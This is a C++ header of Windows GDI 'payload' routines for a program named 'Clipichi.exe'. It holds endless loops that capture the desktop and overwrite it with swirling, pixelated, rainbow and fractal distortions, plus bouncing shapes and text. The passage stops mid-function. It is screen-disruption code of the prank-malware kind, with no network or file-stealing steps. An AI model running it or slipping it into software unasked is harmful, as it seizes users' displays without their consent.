#pragma once
// spacial payload
#define PI 3.14159265358979323846

void DrawRotatedGradient(HDC hdc, int cx, int cy, int size, float angle)
{
    // Compute half size
    float half = size / 2.0f;

    // Rectangle center
    float centerX = cx;
    float centerY = cy;

    // Define 4 corners relative to center
    POINT points[4];
    for (int i = 0; i < 4; i++) {
        float x = (i == 0 || i == 3) ? -half : half;
        float y = (i < 2) ? -half : half;

        // Rotate
        float rx = x * cos(angle) - y * sin(angle);
        float ry = x * sin(angle) + y * cos(angle);

        points[i].x = (LONG)(centerX + rx);
        points[i].y = (LONG)(centerY + ry);
    }

    // For GradientFill, use top-left and bottom-right of bounding box
    int minX = points[0].x, minY = points[0].y;
    int maxX = points[0].x, maxY = points[0].y;
    for (int i = 1; i < 4; i++) {
        if (points[i].x < minX) minX = points[i].x;
        if (points[i].y < minY) minY = points[i].y;
        if (points[i].x > maxX) maxX = points[i].x;
        if (points[i].y > maxY) maxY = points[i].y;
    }

    TRIVERTEX vertex[2];
    vertex[0].x = minX;
    vertex[0].y = minY;
    vertex[0].Red = 0x8A00;
    vertex[0].Green = 0x6F00;
    vertex[0].Blue = 0x0000;
    vertex[0].Alpha = 0x0000;

    vertex[1].x = maxX;
    vertex[1].y = maxY;
    vertex[1].Red = 0x0000;
    vertex[1].Green = 0xFA60;
    vertex[1].Blue = 0x1900;
    vertex[1].Alpha = 0x0000;

    GRADIENT_RECT gRect;
    gRect.UpperLeft = 0;
    gRect.LowerRight = 1;

    GradientFill(hdc, vertex, 2, &gRect, 1, GRADIENT_FILL_RECT_H);
}

DWORD WINAPI GDIBALL(LPVOID lpParam)
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    int signX = 1, signY = 1;
    int incrementor = 5;
    int x = 100, y = 100;
    float angle = 0.0f;

    while (1) {
        HDC hdc = GetDC(0);

        // Draw rotated gradient
        DrawRotatedGradient(hdc, x, y, 100, angle);

        // Move square
        x += incrementor * signX;
        y += incrementor * signY;

        // Bounce
        if (x >= w || x <= 0) signX *= -1;
        if (y >= h || y <= 0) signY *= -1;

        // Rotate
        angle += 0.05f; // rotation speed

        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI textout3(LPVOID lpParam)
{
    srand((unsigned int)time(NULL));

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    int x = 10, y = 10;
    int dx = 4, dy = 4;

    const char* text = "Clipichi.exe";

    // List of fonts to randomize
    const char* fonts[] = {
        "Comic Sans MS",
        "Arial",
        "Tahoma",
        "Verdana",
        "Courier New",
        "Impact",
        "Times New Roman",
        "Consolas"
    };

    const int fontCount = sizeof(fonts) / sizeof(fonts[0]);

    while (true)
    {
        HDC hdc = GetDC(NULL);

        x += dx;
        y += dy;

        // Bounce logic
        if (x <= 0 || x >= screenW - 200) dx = -dx;
        if (y <= 0 || y >= screenH - 50)  dy = -dy;

        SetBkMode(hdc, TRANSPARENT);

        SetTextColor(hdc, RGB(
            rand() % 256,
            rand() % 256,
            rand() % 256
        ));

        int fontSize = 20 + rand() % 40;
        int angle = rand() % 3600;

        HFONT font = CreateFontA(
            fontSize, 0, angle, angle,
            FW_NORMAL,
            FALSE, FALSE, FALSE,
            ANSI_CHARSET,
            OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE,
            fonts[rand() % fontCount]
        );

        HFONT oldFont = (HFONT)SelectObject(hdc, font);

        TextOutA(hdc, x, y, text, lstrlenA(text));

        SelectObject(hdc, oldFont);
        DeleteObject(font);
        ReleaseDC(NULL, hdc);

        Sleep(1);
    }

    return 0;
}
//gdi payload head
//gdi1
namespace p1 {
    typedef struct
    {
        FLOAT h;
        FLOAT s;
        FLOAT l;
    } HSL;

    namespace Colors
    {
        __forceinline HSL rgb2hsl(const RGBQUAD& c)
        {
            FLOAT r = c.rgbRed / 255.0f;
            FLOAT g = c.rgbGreen / 255.0f;
            FLOAT b = c.rgbBlue / 255.0f;

            FLOAT maxv = max(r, max(g, b));
            FLOAT minv = min(r, min(g, b));
            FLOAT d = maxv - minv;

            HSL hsl{};
            hsl.l = (maxv + minv) * 0.5f;

            if (d != 0.0f)
            {
                hsl.s = (hsl.l < 0.5f) ? (d / (maxv + minv)) : (d / (2.0f - maxv - minv));

                if (maxv == r)      hsl.h = (g - b) / d + (g < b ? 6.0f : 0.0f);
                else if (maxv == g) hsl.h = (b - r) / d + 2.0f;
                else                hsl.h = (r - g) / d + 4.0f;

                hsl.h /= 6.0f;
            }
            return hsl;
        }

        __forceinline RGBQUAD hsl2rgb(const HSL& hsl)
        {
            FLOAT r, g, b;

            if (hsl.s == 0.0f)
            {
                r = g = b = hsl.l;
            }
            else
            {
                auto hue2rgb = [](FLOAT p, FLOAT q, FLOAT t)
                    {
                        if (t < 0.0f) t += 1.0f;
                        if (t > 1.0f) t -= 1.0f;
                        if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
                        if (t < 1.0f / 2.0f) return q;
                        if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
                        return p;
                    };

                FLOAT q = (hsl.l < 0.5f)
                    ? hsl.l * (1.0f + hsl.s)
                    : hsl.l + hsl.s - hsl.l * hsl.s;
                FLOAT p = 2.0f * hsl.l - q;

                r = hue2rgb(p, q, hsl.h + 1.0f / 3.0f);
                g = hue2rgb(p, q, hsl.h);
                b = hue2rgb(p, q, hsl.h - 1.0f / 3.0f);
            }

            RGBQUAD rgb;
            rgb.rgbRed = (BYTE)(r * 255.0f);
            rgb.rgbGreen = (BYTE)(g * 255.0f);
            rgb.rgbBlue = (BYTE)(b * 255.0f);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }
    DWORD WINAPI GDI(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(hdc);

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bmi{};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbq = nullptr;
        HBITMAP dib = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbq, NULL, 0);
        SelectObject(memDC, dib);

        int t = 0;
        FLOAT cx = w * 0.5f;
        FLOAT cy = h * 0.5f;

        while (true)
        {
            BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            for (int y = 0; y < h; y++)
            {
                for (int x = 0; x < w; x++)
                {
                    int i = y * w + x;

                    FLOAT dx = x - cx;
                    FLOAT dy = y - cy;
                    FLOAT dist = sqrtf(dx * dx + dy * dy);

                    HSL hsl = Colors::rgb2hsl(rgbq[i]);

                    // swirl + rotate mix
                    hsl.h += dist * 0.0005f + t * 0.002f;
                    hsl.h = fmodf(hsl.h, 1.0f);

                    rgbq[i] = Colors::hsl2rgb(hsl);
                }
            }

            BitBlt(hdc, 0, 0, w, h, memDC, 0, 0, SRCCOPY);

            t++;
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
            hdc = GetDC(NULL);
        }

        return 0x00;
    }
}
//gdi2
namespace p2 {

    typedef struct
    {
        FLOAT h;
        FLOAT s;
        FLOAT l;
    } HSL;

    namespace Colors
    {
        __forceinline HSL rgb2hsl(const RGBQUAD& rgb)
        {
            FLOAT r = rgb.rgbRed * (1.0f / 255.0f);
            FLOAT g = rgb.rgbGreen * (1.0f / 255.0f);
            FLOAT b = rgb.rgbBlue * (1.0f / 255.0f);

            FLOAT maxc = max(r, max(g, b));
            FLOAT minc = min(r, min(g, b));
            FLOAT l = (maxc + minc) * 0.5f;

            FLOAT h = 0.0f, s = 0.0f;
            FLOAT d = maxc - minc;

            if (d > 0.00001f)
            {
                s = (l < 0.5f) ? d / (maxc + minc) : d / (2.0f - maxc - minc);

                if (maxc == r)      h = (g - b) / d + (g < b ? 6.0f : 0.0f);
                else if (maxc == g) h = (b - r) / d + 2.0f;
                else                h = (r - g) / d + 4.0f;

                h *= (1.0f / 6.0f);
            }

            HSL out = { h, s, l };
            return out;
        }

        __forceinline RGBQUAD hsl2rgb(const HSL& hsl)
        {
            FLOAT r, g, b;

            if (hsl.s == 0.0f)
            {
                r = g = b = hsl.l;
            }
            else
            {
                auto hue2rgb = [](FLOAT p, FLOAT q, FLOAT t)
                    {
                        if (t < 0.0f) t += 1.0f;
                        if (t > 1.0f) t -= 1.0f;
                        if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
                        if (t < 1.0f / 2.0f) return q;
                        if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
                        return p;
                    };

                FLOAT q = (hsl.l < 0.5f)
                    ? hsl.l * (1.0f + hsl.s)
                    : hsl.l + hsl.s - hsl.l * hsl.s;
                FLOAT p = 2.0f * hsl.l - q;

                r = hue2rgb(p, q, hsl.h + 1.0f / 3.0f);
                g = hue2rgb(p, q, hsl.h);
                b = hue2rgb(p, q, hsl.h - 1.0f / 3.0f);
            }

            RGBQUAD rgb;
            rgb.rgbRed = (BYTE)(r * 255.0f);
            rgb.rgbGreen = (BYTE)(g * 255.0f);
            rgb.rgbBlue = (BYTE)(b * 255.0f);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }

    DWORD WINAPI GDI(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bmi = {};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbq = 0;
        HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbq, 0, 0);

        HDC hdcMem = CreateCompatibleDC(hdc);
        SelectObject(hdcMem, bmp);

        int t = 0;

        while (1)
        {
            BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            int block = 4 + (int)(6 * (0.5f + 0.5f * sinf(t * 0.02f)));

            for (int y = 0; y < h; y += block)
            {
                for (int x = 0; x < w; x += block)
                {
                    int idx = y * w + x;

                    HSL hsl = Colors::rgb2hsl(rgbq[idx]);
                    hsl.h = fmodf(hsl.h + 0.002f * t + (FLOAT)x / w, 1.0f);

                    RGBQUAD out = Colors::hsl2rgb(hsl);

                    for (int by = 0; by < block; ++by)
                    {
                        for (int bx = 0; bx < block; ++bx)
                        {
                            int px = x + bx;
                            int py = y + by;
                            if (px < w && py < h)
                                rgbq[py * w + px] = out;
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            ++t;
        }

        ReleaseDC(NULL, hdc);
        DeleteDC(hdcMem);
        return 0x00;
    }
}
//gdi3
namespace p3 {
#define _USE_MATH_DEFINES 1
#include <cmath>
#define M_PI 3.14159265358979323846

    // -----------------------------------------------------
    // TRGBQUAD (faster, aligned RGBA pixel struct)
    // -----------------------------------------------------
    typedef struct TRGBQUAD {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE a;
    } TRGBQUAD;

    // -----------------------------------------------------

    DWORD WINAPI GDI(LPVOID lpParam)
    {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        HDC desk = GetDC(NULL);
        HDC mem = CreateCompatibleDC(desk);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = sw;
        bmi.bmiHeader.biHeight = -sh;       // top-down DIB
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* px = NULL;

        HBITMAP dib = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&px, NULL, 0);
        SelectObject(mem, dib);

        double ang = 0.0;

        while (1)
        {
            // Grab the screen → DIB memory
            BitBlt(mem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);

            // Swirl + Rainbow Pixelate Shader
            double cs = cos(ang);
            double sn = sin(ang);

            for (int y = 0; y < sh; y++)
            {
                for (int x = 0; x < sw; x++)
                {
                    int idx = y * sw + x;

                    // center offsets
                    int cx = x - sw / 2;
                    int cy = y - sh / 2;

                    // swirl effect
                    int sx = (int)(cx * cs - cy * sn) + sw / 2;
                    int sy = (int)(cx * sn + cy * cs) + sh / 2;

                    if (sx < 0 || sy < 0 || sx >= sw || sy >= sh) continue;

                    int sidx = sy * sw + sx;

                    // Rainbow effect
                    BYTE add = (BYTE)((sin((x + y + ang * 50) * 0.008) + 1.0) * 100.0);

                    TRGBQUAD p = px[sidx];
                    p.r += min(255, p.r + add);
                    p.g += min(255, p.g + (add / 2));
                    p.b += min(255, p.b + (add / 3));

                    px[idx] = p;
                }
            }

            // blur sweep using BitBlt offsets
            for (int i = 0; i < sw; i++)
            {
                int wave = (int)(sin(i * 0.01 + ang) * 8);
                BitBlt(mem, i, 0, 1, sh, mem, i, wave, SRCCOPY);
            }

            // alpha blend back to screen
            BLENDFUNCTION bf = { AC_SRC_OVER, 0, 120, 0 };
            AlphaBlend(desk, 0, 0, sw, sh, mem, 0, 0, sw, sh, bf);

            ang += 0.02;

            Sleep(1);
        }

        DeleteObject(dib);
        DeleteDC(mem);
        ReleaseDC(NULL, desk);

        return 0;
    }
}
//gdi4
namespace p4 {
    typedef struct _TRGBQUAD {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE a; // Reserved
    } TRGBQUAD, * PTRGBQUAD;
    DWORD WINAPI GDI(LPVOID lpParam)
    {
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h; // top-down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        PTRGBQUAD pixels = nullptr;
        HBITMAP hbm = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(hdcMem, hbm);

        int t = 0;

        for (;;)
        {
            // Shaky BitBlt
            BitBlt(hdcMem, rand() % 2, rand() % 2, w, h,
                hdcScreen, rand() % 2, rand() % 2, SRCAND);

            // Glitchy rainbow shader
            for (int i = 0; i < w * h; i++)
            {
                // Multiply colors for “glitch” effect safely
                int r = pixels[i].r + 10;
                int g = pixels[i].g + 10;
                int b = pixels[i].b + 10;

                // Rainbow cycling using sine waves
                r = (r + (int)(128 + 127 * sin(t * 0.01))) % 256;
                g = (g + (int)(128 + 127 * sin(t * 0.013))) % 256;
                b = (b + (int)(128 + 127 * sin(t * 0.017))) % 256;

                pixels[i].r = (BYTE)r;
                pixels[i].g *= (BYTE)g;
                pixels[i].b = (BYTE)b;
            }

            // Draw to screen
            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);

            t++;
            Sleep(1);
        }

        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }
}
//gdi5
namespace p5 {
    typedef struct { FLOAT h, s, l; } HSL;

    namespace Colors
    {
        // Convert RGB to HSL
        HSL rgb2hsl(RGBQUAD rgb)
        {
            HSL hsl;
            FLOAT r = rgb.rgbRed / 255.f;
            FLOAT g = rgb.rgbGreen / 255.f;
            FLOAT b = rgb.rgbBlue / 255.f;

            FLOAT maxc = max(r, max(g, b));
            FLOAT minc = min(r, min(g, b));
            FLOAT delta = maxc - minc;

            hsl.l = (maxc + minc) / 2.f;

            if (delta == 0.f)
            {
                hsl.h = 0.f;
                hsl.s = 0.f;
            }
            else
            {
                hsl.s = hsl.l < 0.5f ? delta / (maxc + minc) : delta / (2.f - maxc - minc);

                if (r == maxc) hsl.h = (g - b) / delta;
                else if (g == maxc) hsl.h = 2.f + (b - r) / delta;
                else hsl.h = 4.f + (r - g) / delta;

                hsl.h /= 6.f;
                if (hsl.h < 0.f) hsl.h += 1.f;
            }
            return hsl;
        }

        // Convert HSL to RGB
        RGBQUAD hsl2rgb(HSL hsl)
        {
            FLOAT r, g, b;
            if (hsl.s == 0.f)
            {
                r = g = b = hsl.l; // grayscale
            }
            else
            {
                auto hue2rgb = [](FLOAT p, FLOAT q, FLOAT t)
                    {
                        if (t < 0.f) t += 1.f;
                        if (t > 1.f) t -= 1.f;
                        if (t < 1.f / 6.f) return p + (q - p) * 6.f * t;
                        if (t < 1.f / 2.f) return q;
                        if (t < 2.f / 3.f) return p + (q - p) * (2.f / 3.f - t) * 6.f;
                        return p;
                    };

                FLOAT q = hsl.l < 0.5f ? hsl.l * (1.f + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
                FLOAT p = 2.f * hsl.l - q;
                r = hue2rgb(p, q, hsl.h + 1.f / 3.f);
                g = hue2rgb(p, q, hsl.h);
                b = hue2rgb(p, q, hsl.h - 1.f / 3.f);
            }

            RGBQUAD rgb;
            rgb.rgbRed = (BYTE)min(max(int(r * 255.f), 0), 255);
            rgb.rgbGreen = (BYTE)min(max(int(g * 255.f), 0), 255);
            rgb.rgbBlue = (BYTE)min(max(int(b * 255.f), 0), 255);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }
    DWORD WINAPI GDI(LPVOID lpParam)
    {
        // Screen dimensions
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        // Wave parameters
        int xSize = sw / 20;
        int ySize = 20;

        // Get the screen DC once
        HDC hdcScreen = GetDC(0);

        // Create a memory DC and bitmap once
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, sw, sh);
        SelectObject(hdcMem, hBitmap);

        while (true) {
            // Copy current screen to memory DC
            BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY);

            // Apply swirl effect
            for (int i = 0; i < sw; i += 2) { // process in small blocks for speed
                int wave = (int)(sin(i / (float)xSize * 3.14159f) * ySize);
                BitBlt(hdcMem, i, 0, 2, sh, hdcMem, i, wave, SRCCOPY);
                BitBlt(hdcMem, 0, i, sw, 2, hdcMem, wave, i, SRCCOPY);
            }

            // Draw the memory DC to screen
            BitBlt(hdcScreen, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);

            Sleep(1);
        }

        // Cleanup (never reached in infinite loop)
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(0, hdcScreen);

        return 0;
    }
    DWORD WINAPI GDI2(LPVOID lpParam)
    {
        HDC hdcScreen = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h; // top-down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        void* ptr = nullptr;
        HBITMAP bmp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &ptr, NULL, 0);
        RGBQUAD* pixels = (RGBQUAD*)ptr;

        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        SelectObject(hdcMem, bmp);

        int i = 0;
        while (true)
        {
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

            for (int y = 0; y < h; y++)
            {
                for (int x = 0; x < w; x++)
                {
                    int idx = y * w + x;
                    RGBQUAD rgb = pixels[idx];

                    HSL hsl = Colors::rgb2hsl(rgb);

                    // Shader animation fx/fx2/fx3/fx4
                    FLOAT fx = tanf(x / 500.f - y / (FLOAT)h * 0.1f) + i / 5.f;
                    FLOAT fx2 = cosf(y / 500.f - x / (FLOAT)w * 0.1f) + i / 5.f;
                    FLOAT fx3 = sinf(x / 500.f - y / (FLOAT)h * 0.1f) + i / 5.f;
                    FLOAT fx4 = (fx + fx2 + fx3) * (fx + fx2 + fx3);

                    hsl.h = fmodf(fx4 / 500.f + hsl.h + 0.02f, 1.f);
                    hsl.s = 1.f;
                    hsl.l = 0.5f;

                    pixels[idx] = Colors::hsl2rgb(hsl);
                }
            }

            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            i++;
            Sleep(1); // optional small delay
        }

        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        DeleteObject(bmp);
        return 0;
    }
}
//gdi6
namespace p6 {
#include <omp.h>

    typedef struct _TRGBQUAD
    {
        BYTE rgbBlue;
        BYTE rgbGreen;
        BYTE rgbRed;
        BYTE rgbReserved;
    } TRGBQUAD;
    DWORD WINAPI GDI(LPVOID lpParam)
    {
        // Screen size
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int ws = w / 4;
        int hs = h / 4;

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs; // top-down DIB
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* trgbquad = nullptr;

        HBITMAP bmp = CreateDIBSection(
            dc,
            &bmi,
            DIB_RGB_COLORS,
            (void**)&trgbquad,
            NULL,
            0
        );

        SelectObject(dcCopy, bmp);

        int i = 0;
        double angle = 0.0;

        while (1)
        {
            // Capture screen
            StretchBlt(
                dcCopy,
                0, 0, ws, hs,
                dc,
                0, 0, w, h,
                SRCCOPY
            );

            double ca = cos(angle);
            double sa = sin(angle);

#pragma omp parallel for schedule(static)
            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int index = y * ws + x;

                    int cx = x - (ws / 2);
                    int cy = y - (hs / 2);

                    int zx = (int)(ca * cx - sa * cy);
                    int zy = (int)(sa * cx + ca * cy);

                    int fx = zx + zy + i;
                    int v = ((int)sqrt((double)index));

                    trgbquad[index].rgbRed += (BYTE)(v | (trgbquad[index].rgbRed) + 255);
                    trgbquad[index].rgbGreen += (BYTE)(v | (trgbquad[index].rgbGreen) + 255);
                    trgbquad[index].rgbBlue += (BYTE)(v | (trgbquad[index].rgbBlue) + 255);
                }
            }

            i++;
            angle += 0.01;

            // Blit back to screen
            StretchBlt(
                dc,
                0, 0, w, h,
                dcCopy,
                0, 0, ws, hs,
                SRCCOPY
            );

            Sleep(1);
        }

        return 0;
    }
}
//gdi7
namespace p7 {
#define M_PI 3.14159265358979323846

    // ---------------- HSL struct ----------------
    struct HSL {
        float h, s, l;
    };

    // ---------------- HSL <-> RGB conversion ----------------
    HSL rgb2hsl(RGBQUAD rgb) {
        float r = rgb.rgbRed / 255.f;
        float g = rgb.rgbGreen / 255.f;
        float b = rgb.rgbBlue / 255.f;

        float minVal = fminf(r, fminf(g, b));
        float maxVal = fmaxf(r, fmaxf(g, b));
        float delta = maxVal - minVal;

        HSL hsl;
        hsl.l = (maxVal + minVal) / 2.f;

        if (delta == 0.f) {
            hsl.h = 0.f;
            hsl.s = 0.f;
        }
        else {
            hsl.s = (hsl.l < 0.5f) ? (delta / (maxVal + minVal)) : (delta / (2.f - maxVal - minVal));
            if (r == maxVal) hsl.h = (g - b) / delta + (g < b ? 6.f : 0.f);
            else if (g == maxVal) hsl.h = (b - r) / delta + 2.f;
            else hsl.h = (r - g) / delta + 4.f;
            hsl.h /= 6.f;
        }
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        float r, g, b;
        float h = hsl.h, s = hsl.s, l = hsl.l;

        if (s == 0.f) {
            r = g = b = l;
        }
        else {
            auto hue2rgb = [](float p, float q, float t) -> float {
                if (t < 0.f) t += 1.f;
                if (t > 1.f) t -= 1.f;
                if (t < 1.f / 6.f) return p + (q - p) * 6.f * t;
                if (t < 1.f / 2.f) return q;
                if (t < 2.f / 3.f) return p + (q - p) * (2.f / 3.f - t) * 6.f;
                return p;
                };
            float q = l < 0.5f ? l * (1.f + s) : l + s - l * s;
            float p = 2.f * l - q;
            r = hue2rgb(p, q, h + 1.f / 3.f);
            g = hue2rgb(p, q, h);
            b = hue2rgb(p, q, h - 1.f / 3.f);
        }

        RGBQUAD rgb;
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        rgb.rgbReserved = 0;
        return rgb;
    }
    DWORD WINAPI GDI(LPVOID lpParam)
    {
        HDC hdcScreen = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h; // top-down DIB
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* pixels = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);

        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        SelectObject(hdcMem, hBitmap);

        int frame = 0;
        double fractalX = 2.5 / w;
        double fractalY = 1.9 / h;

        while (true) {
            // Capture screen
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

            // Pixel processing with HSL + fractal
            for (int y = 0; y < h; y++) {
                for (int x = 0; x < w; x++) {
                    int idx = y * w + x;
                    RGBQUAD px = pixels[idx];

                    HSL hsl = rgb2hsl(px);

                    // Fractal zoom effect
                    double cx = x * fractalX - 2.0;
                    double cy = y * fractalY - 0.95;
                    double zx = 0, zy = 0;
                    int iter = 0;
                    while ((zx * zx + zy * zy) < 10 && iter < 50) {
                        double tmp = zx * zx - zy * zy + cx;
                        zy = 2 * zx * zy + cy;
                        zx = tmp;
                        iter++;
                    }

                    hsl.h = fmod((frame / 500.f) + hsl.h + 0.02f, 1.f);
                    hsl.s = 1.f;
                    hsl.l = 0.5f + iter / 100.f;

                    pixels[idx] = hsl2rgb(hsl);
                }
            }

            // Custom swirl/wave distortion
            HBITMAP tmpBmp = CreateCompatibleBitmap(hdcScreen, w, h);
            HDC tmpDC = CreateCompatibleDC(hdcScreen);
            SelectObject(tmpDC, tmpBmp);
            BitBlt(tmpDC, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);

            int xSize = h / 10, ySize = 9;
            for (int i = 0; i < h; i++) {
                int wave = (int)(sin(i / (float)xSize * M_PI) * ySize);
                BitBlt(hdcMem, 0, i, w, 1, tmpDC, wave, i, SRCCOPY);
            }
            for (int i = 0; i < w; i++) {
                int wave = (int)(sin(i / (float)xSize * M_PI) * ySize);
                BitBlt(hdcMem, i, 0, 1, h, tmpDC, i, wave, SRCCOPY);
            }

            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);

            DeleteObject(tmpBmp);
            DeleteDC(tmpDC);

            frame++;
        }

        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }
}
//gdi8
namespace p8 {
#include <omp.h>

    typedef struct _TRGBQUAD {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE a;
    } TRGBQUAD;
    DWORD WINAPI GDI(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int ws = w / 4;
        int hs = h / 4;

        BITMAPINFO bmi;
        ZeroMemory(&bmi, sizeof(bmi));

        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* pixels = 0;

        HBITMAP bmp = CreateDIBSection(
            dc,
            &bmi,
            DIB_RGB_COLORS,
            (void**)&pixels,
            NULL,
            0
        );

        SelectObject(dcCopy, bmp);

        float i = 0.0f;

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

#pragma omp parallel for schedule(static)
            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int idx = y * ws + x;

                    float fx = (float)(tan(x / 500.0f - y / (float)h * 0.1f) + i / 5.0f);
                    float fx2 = (float)(cos(y / 500.0f - x / (float)w * 0.1f) + i / 2.0f);
